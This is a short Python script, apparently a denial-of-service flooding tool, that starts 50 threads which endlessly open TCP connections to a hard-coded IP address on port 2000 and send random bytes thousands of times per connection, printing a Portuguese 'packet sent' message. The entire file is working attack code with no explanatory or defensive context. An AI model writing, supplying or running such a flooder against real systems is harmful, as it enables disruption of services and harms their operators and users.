import random
import socket
import threading

ip = "172.21.210.74"
port = 2000
times = 50000
threads = 50

def exec():
	info = random._urandom(16)
	i = random.choice(("a","b","c"))
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			for x in range(times):
				s.send(info)
			print(i +" Pacote Enviado")

for y in range(threads):
		th = threading.Thread(target = exec)
		th.start()

# for y in range(threads):
# 		th = threading.Thread(target = exec)
# 		th.start()